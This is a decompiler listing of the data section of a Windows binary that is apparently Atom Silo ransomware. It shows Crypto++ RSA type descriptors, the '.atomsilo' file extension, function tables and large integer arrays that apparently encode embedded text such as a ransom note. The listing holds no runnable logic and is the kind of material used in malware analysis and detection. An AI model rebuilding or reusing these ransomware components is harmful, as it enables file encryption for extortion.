const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, 5184, 0, 740104 }; // idb
const _ThrowInfo _TI2_AVimproper_lock_Concurrency__ = { 0u, 5184, 0, 740208 }; // idb
const _ThrowInfo _TI2_AVscheduler_resource_allocation_error_Concurrency__ = { 0u, 5184, 0, 740304 }; // idb
const _ThrowInfo _TI2_AVunsupported_os_Concurrency__ = { 0u, 5184, 0, 740400 }; // idb
const _ThrowInfo _TI2_AVinvalid_operation_Concurrency__ = { 0u, 5184, 0, 740496 }; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_reference_Concurrency__ = { 0u, 5184, 0, 740592 }; // idb
const _ThrowInfo _TI2_AVimproper_scheduler_attach_Concurrency__ = { 0u, 5184, 0, 740688 }; // idb
const _ThrowInfo _TI2_AVmissing_wait_Concurrency__ = { 0u, 5184, 0, 740784 }; // idb
const _ThrowInfo _TI2_AV_Interruption_exception_details_Concurrency__ = { 0u, 5184, 0, 740880 }; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_key_Concurrency__ = { 0u, 5184, 0, 740976 }; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_value_Concurrency__ = { 0u, 5184, 0, 741072 }; // idb
const _ThrowInfo _TI2_AVinvalid_scheduler_policy_thread_specification_Concurrency__ = { 0u, 5184, 0, 741168 }; // idb
const _ThrowInfo _TI2_AVcontext_unblock_unbalanced_Concurrency__ = { 0u, 5184, 0, 741264 }; // idb
const _ThrowInfo _TI2_AVcontext_self_unblock_Concurrency__ = { 0u, 5184, 0, 741360 }; // idb
const _ThrowInfo _TI2_AVinvalid_oversubscribe_operation_Concurrency__ = { 0u, 5184, 0, 741456 }; // idb
const _ThrowInfo _TI2_AVnested_scheduler_missing_detach_Concurrency__ = { 0u, 5184, 0, 741552 }; // idb
const _ThrowInfo _TI3_AVscheduler_worker_creation_error_Concurrency__ = { 0u, 5184, 0, 741648 }; // idb
const _ThrowInfo _TI2_AVbad_exception_std__ = { 0u, 5184, 0, 741896 }; // idb
const _ThrowInfo _TI4_AUInputRejected___InputRejecting_VBufferedTransformation_CryptoPP___CryptoPP__ = { 0u, 5712, 0, 742656 }; // idb
const _ThrowInfo _TI4_AUInputRejected___InputRejecting_VFilter_CryptoPP___CryptoPP__ = { 0u, 5712, 0, 742160 }; // idb
const _ThrowInfo _TI3_AVNotImplemented_CryptoPP__ = { 0u, 5712, 0, 742128 }; // idb
const _ThrowInfo _TI3_AVInvalidArgument_CryptoPP__ = { 0u, 5712, 0, 742056 }; // idb
const _ThrowInfo _TI4_AVValueTypeMismatch_NameValuePairs_CryptoPP__ = { 0u, 5712, 0, 742536 }; // idb
const _ThrowInfo _TI4_AVInvalidMaterial_CryptoMaterial_CryptoPP__ = { 0u, 5712, 0, 742872 }; // idb
const _ThrowInfo _TI3_AVCannotFlush_CryptoPP__ = { 0u, 5712, 0, 741960 }; // idb
const _ThrowInfo _TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__ = { 0u, 5712, 0, 742320 }; // idb
__int64 qword_13F1B7008 = 0i64; // weak
__int64 qword_13F1B7018 = 0i64; // weak
__int64 qword_13F1B7028 = 4473153i64; // weak
__int64 qword_13F1B7038 = 3i64; // weak
__int64 (__fastcall *(*off_13F1B7048)[2])() = &off_13F182E48; // weak
__int64 qword_13F1B7050[3] = { 5353518400i64, 5353518768i64, 0i64 }; // weak
int dword_13F1B7070 = 64; // weak
__int64 qword_13F1B7078 = 0i64; // weak
__int64 qword_13F1B7090 = 0i64; // weak
__int64 qword_13F1B7098 = 0i64; // weak
__int64 qword_13F1B70B0 = 3986352i64; // weak
__int64 (__fastcall *(*off_13F1B70C0)[2])() = &off_13F188A20; // weak
__int64 qword_13F1B70C8 = 0i64; // weak
__int64 qword_13F1B70E8 = 0i64; // weak
char byte_13F1B7108 = '\x01'; // weak
__int64 (__fastcall *(*off_13F1B7110)[2])() = &off_13F188A10; // weak
__int64 (__fastcall *(*off_13F1B7118[2])[4])() = { &off_13F185278, NULL }; // weak
__int64 (__fastcall *(*off_13F1B7148[2])[4])() = { &off_13F185278, NULL }; // weak
char byte_13F1B7178 = '\x01'; // weak
int dword_13F1B7180 = -2147483643; // weak
__int64 qword_13F1B7188 = -49228637361375i64; // weak
uintptr_t _security_cookie = 49228637361374ui64;
int dword_13F1B71A0 = 5; // weak
int dword_13F1B71A4 = 46; // weak
__int64 qword_13F1B71A8 = -1i64; // weak
int dword_13F1B71C0 = 4000; // weak
int dword_13F1B71C8 = -1; // weak
int dword_13F1B71D0 = -1; // weak
int dword_13F1B71D4 = 1; // weak
__int128 xmmword_13F1B71E0 = 0x100000001FFFFFFFF00000000i64; // weak
__int128 xmmword_13F1B71F0 = 8i64; // weak
__int64 qword_13F1B7210[12] =
{
  5353549568i64,
  5353549584i64,
  5353549600i64,
  5353549616i64,
  5353549648i64,
  5353549672i64,
  5353549696i64,
  5353549712i64,
  5353549736i64,
  5353549760i64,
  5353549784i64,
  0i64
}; // weak
__int64 qword_13F1B7270[2] = { 5353551528i64, 0i64 }; // weak
int dword_13F1B72E0 = 3; // weak
__int64 qword_13F1B72F0[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1B7308[3] = { 0i64, 0i64, 0i64 }; // weak
char byte_13F1B73F8[4] = { '\f', '\0', '\0', '\0' }; // weak
int dword_13F1B73FC = 8; // weak
char (*off_13F1B7400)[4] = &byte_13F1B7498; // weak
char byte_13F1B7498[4] = { '.', '\0', '\0', '\0' }; // weak
int dword_13F1B749C = 46; // weak
int dword_13F1B74A4 = 4; // weak
wchar_t *off_13F1B74B0 = L"         (((((                  H"; // weak
__int128 xmmword_13F1B7608 = 0x3C38E0000000013F1B74B0i64; // weak
char byte_13F1B7618[4] = { 'C', '\0', '\0', '\0' }; // weak
__int64 qword_13F1B7620[11] = { 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64 }; // weak
__int64 qword_13F1B7848 = 3946720i64; // weak
__int64 qword_13F1B7850[2] = { 134480385i64, 0i64 }; // weak
__int64 qword_13F1B7860[10] =
{
  -9045055027768458332i64,
  33i64,
  57254i64,
  42401i64,
  4242579329i64,
  4236279360i64,
  -6639814651280358488i64,
  32i64,
  0i64,
  0i64
}; // weak
__int64 qword_13F1B7950[8] = { 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64 }; // weak
__int64 qword_13F1B7A60[8] = { 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64 }; // weak
int dword_13F1B7B60 = -2; // weak
__int64 qword_13F1B7B70 = -2i64; // weak
int dword_13F1B7B80 = 1; // weak
__int64 qword_13F1B7B88 = 232i64; // weak
__int64 (*off_13F1B7C70[2])[8] = { &qword_13F1B7BF0, &qword_13F1B7C30 }; // weak
int dword_13F1B7C80 = 3072; // weak
__int64 qword_13F1B7C88 = 2373i64; // weak
char aAtomsilo[10] = ".atomsilo"; // weak
__int64 qword_13F1B91E8 = 548i64; // weak
char aBoot[5] = "Boot"; // weak
__int64 qword_13F1BB170[70] =
{
  650221696548241968i64,
  72354425775621674i64,
  3661932116575489i64,
  72763489227276848i64,
  9104112403757845248i64,
  -1363802886549868919i64,
  4399290479177103280i64,
  -9165845458103040924i64,
  7015221711908914785i64,
  -6918011849931504388i64,
  -5212818011549872001i64,
  9111245211118414550i64,
  5661879740097712168i64,
  -943999993955037268i64,
  7201665250131064646i64,
  -2946198024162266243i64,
  859220892942943877i64,
  7468561985058156665i64,
  5160689122212297668i64,
  7695881269312496216i64,
  1819541050838797736i64,
  -3137682904582243754i64,
  -6410625393068243325i64,
  2530794103070106513i64,
  -5063646132981910022i64,
  4952417268876145168i64,
  1812883581946744913i64,
  5567917802098505098i64,
  -8314941549136180233i64,
  2603990377823050218i64,
  8439566953345158147i64,
  9121456432140835715i64,
  -4222117046096272934i64,
  1634167028066554886i64,
  2418691452281071639i64,
  -3221819295768878971i64,
  7058540174252996067i64,
  8373576465728516116i64,
  2361046160715682542i64,
  -2541030615961310048i64,
  -7095546362049714724i64,
  6261613410848714537i64,
  5169697414323197077i64,
  9214393112916140961i64,
  -6093057872909386372i64,
  -8195939056386361834i64,
  -5945150129208840746i64,
  5356865708566440378i64,
  -3915583364192565586i64,
  8453104141984670661i64,
  -4035540664055578235i64,
  5140530205224004585i64,
  4429552336585155839i64,
  7424499257181846627i64,
  -65328383518515992i64,
  8020960316112894302i64,
  3408686177277652783i64,
  -2540335969248814160i64,
  -4906410596837049831i64,
  8997331184271947123i64,
  897288050128521467i64,
  8667934666244497282i64,
  -7015304494246711025i64,
  -7419177127785028196i64,
  -2505699608845209578i64,
  -5371169116592759856i64,
  6508313599153192675i64,
  4735011913142308475i64,
  285278747i64,
  0i64
}; // weak
__int64 qword_13F1BB3A0[2] = { 5789751444030890300i64, 954319388409339973i64 }; // weak
__int64 qword_13F1BB3B0[512] =
{
  7791346572711181322i64,
  2481031642461204065i64,
  7233173974892023102i64,
  8387229985664535870i64,
  7310312382841167969i64,
  4048004290443361652i64,
  7598764480801881634i64,
  7885649296117558388i64,
  5269275814207968032i64,
  7598807827363427182i64,
  8388363527180742255i64,
  5205045208109966700i64,
  5281684768620691796i64,
  4692836914159698243i64,
  5283920020060786768i64,
  2467204368979349071i64,
  7596538070207263809i64,
  5498704119153566319i64,
  2315540038083034444i64,
  5641116202174400851i64,
  2467204326246929491i64,
  5641135803786814841i64,
  4995689717092011844i64,
  7596844112195428925i64,
  939293049276753274i64,
  7308349836371953930i64,
  8368318563495801888i64,
  2482454689446393957i64,
  8675467998268099902i64,
  7310478029557169012i64,
  7955443180981023864i64,
  4283597746325513018i64,
  6992130949518002701i64,
  8026268895332367136i64,
  3760544310180867948i64,
  7310478029557152609i64,
  8245918729862214776i64,
  7935406789416809569i64,
  9009743581478743663i64,
  8534154418835753485i64,
  651062674148323941i64,
  7162240928792995188i64,
  4210425200352785007i64,
  7596572451269408032i64,
  971943033358214510i64,
  8872224738192263434i64,
  7738135658438920717i64,
  7146478609286263399i64,
  7287704057415691375i64,
  724300224183887159i64,
  4211551113060747529i64,
  724300201853068064i64,
  7362668983484811529i64,
  2459029689728593249i64,
  5989894588295509324i64,
  7163377994205195873i64,
  5485982670018405487i64,
  8234586046338786165i64,
  8295679039858044513i64,
  7598247066685632097i64,
  8027113320262482790i64,
  4207904020170110062i64,
  724300486361166112i64,
  7506767678785980681i64,
  3539893578755434853i64,
  9009743581479727161i64,
  3204703039399725581i64,
  651347918580705312i64,
  4210418594659527945i64,
  8072993745814630432i64,
  2322282281775162465i64,
  724372592853334832i64,
  651347918584965129i64,
  2322294380749087497i64,
  651347644796658211i64,
  4212106344857430025i64,
  651347645116199456i64,
  4210418594659527945i64,
  724300146068566304i64,
  2319749671105166601i64,
  7813572768968609147i64,
  3834029082756674159i64,
  7957691255579348283i64,
  2322280134292483444i64,
  651347645116199985i64,
  8872210490068700541i64,
  7234014035279677965i64,
  8387502871316754025i64,
  953396656457523258i64,
  7813473817291720970i64,
  651347918584376352i64,
  7453010313246502921i64,
  4210143772621627949i64,
  724300486361166112i64,
  7020393876801027337i64,
  651062674148322412i64,
  2531087253752278883i64,
  651062673075942709i64,
  8820707984245944166i64,
  4284172502116088421i64,
  3317193653583677965i64,
  7510436753567937890i64,
  724370494364939887i64,
  7218553838191773961i64,
  8028075772645172069i64,
  8243105118545787502i64,
  651347644864424300i64,
  7957688115958254973i64,
  8872217045889540468i64,
  7738135658438920717i64,
  7146478609286263399i64,
  7359761651453619311i64,
  7064187429283653222i64,
  3611951164152902255i64,
  7235433502276088944i64,
  3991094594050925344i64,
  8241988678638505275i64,
  4261871034911582567i64,
  3273669896168868365i64,
  4044296685682452855i64,
  651347645183307829i64,
  7453010313246502921i64,
  953396656457523258i64,
  7506947567653816586i64,
  971405820327911781i64,
  7306090318213482762i64,
  7885649515982761330i64,
  8030798245002354746i64,
  7149291935992408428i64,
  651062673076085559i64,
  7074431988655087981i64,
  3611951142846887023i64,
  651062673074894126i64,
  3271705053242876272i64,
  2322288883325497186i64,
  651347643786931762i64,
  2338045703488146813i64,
  7161112673441680763i64,
  4207609402530883435i64,
  724300404558537504i64,
  7020109560155474185i64,
  7738151096046074489i64,
  7594590734645857595i64,
  8390261219792283751i64,
  8241988678638505275i64,
  4210988196360513895i64,
  724300146068566304i64,
  7956003957685160201i64,
  4210143772621627949i64,
  724300146068566304i64,
  7811056383824955657i64,
  7234022797402077039i64,
  8577396904080141925i64,
  3472592222912013417i64,
  971943033358198064i64,
  2337199356025637130i64,
  7161112673441680763i64,
  3270860680037820267i64,
  2531087253752278883i64,
  953465036719141734i64,
  7306090318213482762i64,
  8295758538842585714i64,
  7233382573540994159i64,
  7594204806081493857i64,
  7575118866237124723i64,
  7809854617481210990i64,
  651062673079493487i64,
  4208453775735939440i64,
  651062673074893088i64,
  7596553519322654068i64,
  8389754632254680679i64,
  7064187429283656293i64,
  7956024810049206383i64,
  8243105135629318759i64,
  651347645183255085i64,
  3274791361142809097i64,
  3619332198662168946i64,
  9009743581479989296i64,
  8027224783857453581i64,
  7064187429287829553i64,
  7959390453599265633i64,
  4211551113060756836i64,
  7162468771421365024i64,
  8245917233684548923i64,
  8390261219792151908i64,
  2531133394535805728i64,
  651062673078838370i64,
  4213506044752783716i64,
  3271142103424330016i64,
  724300447492303970i64,
  7956000599020931337i64,
  724300146000542311i64,
  7002381056077990153i64,
  7305718455857539436i64,
  651347645081941102i64,
  8820707984313115145i64,
  7237970018815143529i64,
  953488165902840421i64,
  7306090318213482762i64,
  8319671766489378162i64,
  724300503540838970i64,
  2335167023149841673i64,
  8316288176885468539i64,
  8029390621164792944i64,
  971943033358214510i64,
  971424486386436362i64,
  7598814415792638218i64,
  7813590744886308463i64,
  8386944366889235573i64,
  7307155426317253224i64,
  8228130646336759657i64,
  4212104137291820389i64,
  8375420355282547245i64,
  7161112888847528047i64,
  4207609402530883435i64,
  4279376441876112931i64,
  3547273436310171490i64,
  7235433502276089968i64,
  7017790625657594656i64,
  8820707984313115195i64,
  7237970018815143529i64,
  8087189975657706085i64,
  3619318974457865313i64,
  9009743581106282533i64,
  8751746622595598861i64,
  7507285117719438700i64,
  7078543766317195621i64,
  724246167075513455i64,
  7810121871736978441i64,
  7957688065297970017i64,
  4477266759529357684i64,
  8532461178042518029i64,
  2467255110261826336i64,
  4477266759361062248i64,
  3560161514940336653i64,
  7805618233556615486i64,
  954254494587973481i64,
  7020394095827290378i64,
  8368318559077559404i64,
  7946951334923367529i64,
  8028075781285639283i64,
  7809643570318308206i64,
  3403605352813248108i64,
  724246167075318116i64,
  8532461178042517769i64,
  2467255110261826336i64,
  724303432780375412i64,
  7021238520757422345i64,
  4424061477861924974i64,
  2538467162862871330i64,
  7366588488813197158i64,
  7312272888394182255i64,
  6286500030529418298i64,
  2315210085008036417i64,
  5497001924816621401i64,
  4981057407454040901i64,
  4919430872044815182i64,
  4703249087326994720i64,
  8102872089872319819i64,
  651061559908265569i64,
  954330366073584649i64,
  8243905127405652234i64,
  724303776171637822i64,
  8532461178042517769i64,
  2467255110261826336i64,
  954237766766849641i64,
  4499162037247084810i64,
  4692862353650246999i64,
  3346012247786614644i64,
  8031079741491670867i64,
  2336649604460603680i64,
  8386098829110636409i64,
  7594793497575520544i64,
  2338319731384345964i64,
  8386387641199060322i64,
  7953674032483559777i64,
  8104634775809368164i64,
  8439879164049515892i64,
  724303766626250355i64,
  4773376058211240201i64,
  -9159637267417893771i64,
  8751182848999847065i64,
  7359007639830339628i64,
  7310011937178610793i64,
  8079506545523651360i64,
  2334101988825263986i64,
  8462115405150906484i64,
  7811906009675489568i64,
  2337214414151641452i64,
  2334386829831790960i64,
  4336523816649777522i64,
  651061559908266031i64,
  2340022707895155721i64,
  8295740900239372134i64,
  2336936576962295144i64,
  7882834765976466031i64,
  8223695464129852528i64,
  8728087620014601061i64,
  7308332182667425135i64,
  8367802956849291379i64,
  7235440069297857896i64,
  8295764054658609197i64,
  2334397744802981487i64,
  2334379873258989943i64,
  8391086189174616892i64,
  7813572877221194873i64,
  7075497401392984687i64,
  7020374477307535667i64,
  2338060278192694631i64,
  7309377875217246566i64,
  7814992635317284210i64,
  7953762056929026425i64,
  724270567618722878i64,
  6070412750893943049i64,
  2340020702962279784i64,
  7214889147599249783i64,
  8728104104266720101i64,
  7308332182667425135i64,
  8749479666470035571i64,
  7070773959523002656i64,
  8295742012915743093i64,
  7214885768683283824i64,
  8028075837187318629i64,
  7023210127212879982i64,
  2336646318805509490i64,
  4499147963027583861i64,
  8087348965261511181i64,
  7598258805770048574i64,
  7306000119824934243i64,
  7957695015411085923i64,
  8242000134883210016i64,
  8102886264642543717i64,
  7308349836370144865i64,
  4211551113060753981i64,
  2477317766856009251i64,
  3472328296227680574i64,
  8318818580010329120i64,
  3332222139078225724i64,
  2334633989394021408i64,
  2340008615604481913i64,
  3756123488230074743i64,
  3203029608696389688i64,
  7813304588734265632i64,
  8367798494310572153i64,
  8303547518662221935i64,
  7816406666092372336i64,
  8245928668399025509i64,
  7004049809013613370i64,
  3472328296228011554i64,
  8318818580010329120i64,
  3332222139078225724i64,
  7163382508215553568i64,
  8386676005153153125i64,
  6998720716286619497i64,
  3342908374192055139i64,
  651062673130139452i64,
  2334367907544041737i64,
  7161674624553217647i64,
  7166468639786561637i64,
  7888443356524472687i64,
  2338898147716394597i64,
  2340030545707032931i64,
  2336646318805513321i64,
  7146220168135600482i64,
  3199089972417030511i64,
  2334381307593648482i64,
  8243109542261453423i64,
  954323519223639667i64,
  4499162037247084810i64,
  7311138144931639129i64,
  7017769739500480032i64,
  7306000158563529593i64,
  7307221376432367971i64,
  2337214414335600756i64,
  7935468365038575984i64,
  7310580525027980399i64,
  7738703097024815218i64,
  7811906009675800620i64,
  7957697953151197292i64,
  8534165644796650855i64,
  8242543223732790377i64,
  8367809532444045433i64,
  7236828443234299759i64,
  7526475316495478816i64,
  7594793497575520544i64,
  954323519229093228i64,
  724270338254899466i64,
  7594246806549629193i64,
  651061555559743094i64,
  8243891053693921340i64,
  651061555542756670i64,
  7596553463520650300i64,
  8389754632288431719i64,
  651062673125044837i64,
  7953762057143781641i64,
  2467239687437447968i64,
  7359790479223582563i64,
  8027168674494427447i64,
  4207904020170110062i64,
  7589759588399853618i64,
  8390876208520258925i64,
  3475142978419368051i64,
  8098970903652540464i64,
  3539955086881809780i64,
  4498640213386411057i64,
  4325998851477015053i64,
  4499773529780023912i64,
  4325998851477015053i64,
  8751746559015743603i64,
  8028914707261646188i64,
  3702575957658516082i64,
  8299417705977887585i64,
  2679694774866639465i64,
  651061555559743010i64,
  8535013244209806345i64,
  7883960305294866025i64,
  4494925840433082213i64,
  4325998851477015053i64,
  4423776321996419187i64,
  8299918875829761058i64,
  651062673130021232i64,
  7953762057143781641i64,
  2479359285275158816i64,
  4498640213386411070i64,
  4325998851477015053i64,
  4423776321996419187i64,
  8299918875830350882i64,
  651062673130021232i64,
  7953762057143781641i64,
  2482455510018976032i64,
  4498640213386411070i64,
  4325998851477015053i64,
  724303758878602031i64,
  7219054737202153737i64,
  651061559908267625i64,
  8100131176263190793i64,
  2467239704617295988i64,
  8530215921266484596i64,
  2482732892780983137i64,
  651061555542756670i64,
  7957695015192261990i64,
  7883925335805617952i64,
  651062674148894821i64,
  4981106950789466377i64,
  2323124503386023022i64,
  7310575040359523694i64,
  3472047929352660776i64,
  4192904167988211513i64,
  4262981610203918384i64,
  8505339305676835341i64,
  7589822591961952865i64,
  8603403747904742765i64,
  4262982938492224544i64,
  8505339305676835341i64,
  7945824327161639521i64,
  7306859933594113124i64,
  2317427899351258228i64,
  7883925494633996333i64,
  7883925481582964325i64,
  651062673075152997i64,
  651062672620062985i64,
  7214892365965232393i64,
  7810981629884714301i64,
  3472608963620663151i64,
  3474016046676914224i64,
  651347643853976111i64,
  2338038316144331017i64,
  7362937289855286632i64,
  3544179148831289196i64,
  3904392411231563824i64,
  724300163231917360i64,
  8241998574243088649i64,
  3344050684579114272i64,
  3419402489042005094i64,
  2679701354585272369i64,
  651062673075154998i64,
  8295756276534151433i64,
  7810981629884714301i64,
  3472608963620663151i64,
  953401033162567728i64,
  651061555542756618i64,
  8389754676633104228i64,
  7882825768343267118i64,
  2910532044342980197i64,
  7955940970932237346i64,
  2327320131831752046i64,
  2315448528020971581i64,
  724300132836270404i64,
  7165055522138818825i64,
  7306859998035144053i64,
  8389754676365247860i64,
  7526678434119514434i64,
  8243116113461651746i64,
  7503064188127630408i64,
  8462061527701138208i64,
  651062673074692210i64,
  7887319652480125193i64,
  5004736579750882917i64,
  8737674244549076332i64,
  2964051850319914057i64,
  6073229877479106862i64,
  3107603728117550157i64,
  2459086795088863776i64,
  651061555542756667i64,
  8389754676633104228i64,
  7882825768343267118i64,
  2910532044342980197i64,
  7955940970933220386i64,
  2327320131831752046i64,
  2315448528021954621i64,
  724300132834829651i64,
  724372592836282633i64
}; // weak
char byte_13F1BCDC0[] = { 'a' }; // weak
const unsigned __int8 *unsigned char const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
__int64 qword_13F1BF080 = 0i64; // weak
unsigned __int8 unsigned char `RTTI Type Descriptor' = 112u; // weak
__int64 qword_13F1BF178 = 0i64; // weak
_UNKNOWN CryptoPP::Integer `RTTI Type Descriptor'; // weak
__int64 qword_13F1BF2C8 = 0i64; // weak
_UNKNOWN enum CryptoPP::Integer::RandomNumberType `RTTI Type Descriptor'; // weak
__int64 qword_13F1BF2F0 = 0i64; // weak
const struct CryptoPP::PrimeSelector *CryptoPP::PrimeSelector const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
__int64 qword_13F1BF330 = 0i64; // weak
void **std::string `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct CryptoPP::InvertibleRSAFunction *CryptoPP::InvertibleRSAFunction * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
struct CryptoPP::RSAFunction *CryptoPP::RSAFunction * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
_UNKNOWN CryptoPP::ByteArrayParameter `RTTI Type Descriptor'; // weak
_UNKNOWN Concurrency::details::ExecutionResource `RTTI Type Descriptor'; // weak
_UNKNOWN Concurrency::IExecutionResource `RTTI Type Descriptor'; // weak
__int64 qword_13F1C1B28 = 0i64; // weak
_UNKNOWN CryptoPP::InvertibleRSAFunction `RTTI Type Descriptor'; // weak
__int64 qword_13F1C21A0 = 0i64; // weak
const int *int const * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
void **off_13F1C3040 = &type_info::`vftable'; // weak
__int64 qword_13F1C3048 = 4099600i64; // weak
char aAvrsafunctionC[26] = "?AVRSAFunction@CryptoPP@@"; // weak
_UNKNOWN CryptoPP::ConstByteArrayParameter `RTTI Type Descriptor'; // weak
__int64 qword_13F1C31C0 = 0i64; // weak
bool bool `RTTI Type Descriptor' = true; // weak
__int64 qword_13F1C3828 = 0i64; // weak
int int `RTTI Type Descriptor' = 1058577520; // weak
__int64 qword_13F1C3E50 = 0i64; // weak
void **std::string * `RTTI Type Descriptor' = &type_info::`vftable'; // weak
__int64 qword_13F1C4210 = 0i64; // weak
__int64 qword_13F1C4218[2] = { 0i64, 0i64 }; // weak
__int64 qword_13F1C4230 = 49227196084974i64; // weak
__int64 qword_13F1C4238 = 49227196096142i64; // weak
__int64 qword_13F1C4240 = 49227196025454i64; // weak
__int64 qword_13F1C4248 = 49227196130590i64; // weak
__int64 qword_13F1C4250 = 49227196086926i64; // weak
__int64 qword_13F1C4258 = 49227195877806i64; // weak
__int64 qword_13F1C4260 = 49227196178158i64; // weak
__int64 qword_13F1C4268 = 49227195931342i64; // weak
__int64 qword_13F1C4270 = 49227196177854i64; // weak
__int64 qword_13F1C4278 = 49227195886206i64; // weak
__int64 qword_13F1C4280 = 49227177390814i64; // weak
__int64 qword_13F1C4288 = 49227177171774i64; // weak
__int64 qword_13F1C4290 = 49227177171358i64; // weak
__int64 qword_13F1C4298 = 49227196197886i64; // weak
__int64 qword_13F1C42A0 = 49227177363166i64; // weak
__int64 qword_13F1C42A8 = 49227177191758i64; // weak
__int64 qword_13F1C42B0 = 49227177431934i64; // weak
__int64 qword_13F1C42B8 = 49227175872254i64; // weak
__int64 qword_13F1C42C0 = 49227177459150i64; // weak
__int64 qword_13F1C42C8 = 49227196467214i64; // weak
__int64 qword_13F1C42D0 = 49228637361374i64; // weak
__int64 qword_13F1C42D8 = 49227195932174i64; // weak
__int64 qword_13F1C42E0 = 49227196089902i64; // weak
__int64 qword_13F1C42E8 = 49227196175678i64; // weak
__int64 qword_13F1C42F0 = 49228637361374i64; // weak
__int64 qword_13F1C42F8 = 49227177465294i64; // weak
__int64 qword_13F1C4300 = 49227175900846i64; // weak
__int64 qword_13F1C4308 = 49227177376094i64; // weak
__int64 qword_13F1C4310 = 49227196195342i64; // weak
__int64 qword_13F1C4318 = 49227177465294i64; // weak
__int64 qword_13F1C4320 = 49227177277150i64; // weak
__int64 qword_13F1C4328 = 49227175656414i64; // weak
__int64 qword_13F1C4330 = 49227177277166i64; // weak
__int64 qword_13F1C4338 = 49227196195422i64; // weak
__int64 qword_13F1C4340 = 49227195877790i64; // weak
__int64 qword_13F1C4348 = 49227177347246i64; // weak
__int64 qword_13F1C4350 = 49227177348702i64; // weak
__int64 qword_13F1C4358 = 49227196197630i64; // weak
__int64 qword_13F1C4360 = 49227195900222i64; // weak
__int64 qword_13F1C4368 = 49227196198766i64; // weak
int dword_13F1C4370 = -2147483647; // weak
void **off_13F1C4378 = &CryptoPP::ClassNullRNG::`vftable'; // weak
int dword_13F1C4380 = -2147483643; // weak
__int64 (__fastcall *(*off_13F1C4398)[4])() = &off_13F185278; // weak
__int64 qword_13F1C43A0 = 0i64; // weak
__int128 xmmword_13F1C43A8 = 0x21FFFFFFFFFFFFFFFi64; // weak
__int64 qword_13F1C43B8 = 3942816i64; // weak
int dword_13F1C43C0 = 0; // weak
__int64 (__fastcall *(*off_13F1C43C8)[4])() = &off_13F185278; // weak
__int64 qword_13F1C43D0 = 0i64; // weak
__int128 xmmword_13F1C43D8 = 0x21FFFFFFFFFFFFFFFi64; // weak
__int64 qword_13F1C43E8 = 3942912i64; // weak
int dword_13F1C43F0 = 0; // weak
__int64 (__fastcall *(*off_13F1C43F8)[4])() = &off_13F185278; // weak
__int64 qword_13F1C4400 = 0i64; // weak
__int128 xmmword_13F1C4408 = 0x21FFFFFFFFFFFFFFFi64; // weak
__int64 qword_13F1C4418 = 3942960i64; // weak
int dword_13F1C4420 = 0; // weak
__int64 (__fastcall *funcs_13F121BCD[3])() = { &sub_13F1171E0, &sub_13F117260, &sub_13F117490 }; // weak
__int64 (__fastcall *off_13F1C4438[2])() = { &sub_13F117260, &sub_13F117490 }; // weak
__int64 (__fastcall *off_13F1C4440)() = &sub_13F117490; // weak
__int64 (__fastcall *off_13F1C4450)() = &sub_13F1152D0; // weak
__int64 (__fastcall *funcs_13F121EFC)(_QWORD, _QWORD, _QWORD) = &sub_13F118A90; // weak
__int64 (__fastcall *off_13F1C4488[2])() = { &sub_13F118AC0, &sub_13F118BB0 }; // weak
__int64 (__fastcall *off_13F1C4490)() = &sub_13F118BB0; // weak
__int64 (__fastcall *off_13F1C44A0)() = &sub_13F117C30; // weak
__int64 (__fastcall *funcs_13F121FD2[3])() = { &sub_13F11B8B0, &sub_13F11B920, &sub_13F11BAC0 }; // weak
__int64 (__fastcall *off_13F1C44D8[2])() = { &sub_13F11B920, &sub_13F11BAC0 }; // weak
__int64 (__fastcall *off_13F1C44E0)() = &sub_13F11BAC0; // weak
__int64 (__fastcall *off_13F1C44F0)() = &sub_13F11A750; // weak
__int64 (__fastcall *funcs_13F120B11[3])() = { &sub_13F119FD0, &sub_13F11A060, &sub_13F11A240 }; // weak
__int64 (__fastcall *off_13F1C4528[2])() = { &sub_13F11A060, &sub_13F11A240 }; // weak
__int64 (__fastcall *off_13F1C4530)() = &sub_13F11A240; // weak
__int64 (__fastcall *off_13F1C4540)() = &sub_13F118F80; // weak
__int64 qword_13F1C4570[10] = { 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64, 0i64 }; // weak
int dword_13F1C45C0 = 0; // weak
__int64 qword_13F1C45C8 = 0i64; // weak
__int64 qword_13F1C45D0[256] =
{
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
  0i64,
